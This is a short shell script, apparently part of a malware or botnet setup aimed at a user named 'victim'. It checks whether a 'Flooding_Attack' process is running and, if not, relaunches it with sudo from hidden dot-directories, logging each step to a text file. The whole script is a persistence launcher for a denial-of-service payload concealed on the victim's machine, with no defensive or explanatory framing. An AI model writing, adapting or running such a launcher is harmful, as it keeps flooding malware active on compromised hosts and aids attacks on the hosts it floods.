
echo " start into process_run.sh"  >> /home/victim/Desktop/hello.txt

file=/home/victim/.etc/.module/Flooding_Attack

# whether the process is running 
if pgrep Flooding_Attack >/dev/null
then
     echo "$source_ele_2 --- Process is running."  >> /home/victim/Desktop/hello.txt
else
     echo "$source_ele_2 --- Process is not running."  >> /home/victim/Desktop/hello.txt
     if [ -f "$file" ]
     then
		echo "$file found."  >> /home/victim/Desktop/hello.txt
		sudo /home/victim/.etc/.module/Flooding_Attack &
     	echo "execute Flooding_Attack in /.module"  >> /home/victim/Desktop/hello.txt
	 else
		echo "$file not found."  >> /home/victim/Desktop/hello.txt
		/home/victim/Desktop/.hidden_attack/Flooding_Attack &
     	echo "execute Flooding_Attack in /.hidden_attack"  >> /home/victim/Desktop/hello.txt  
	 fi        
fi
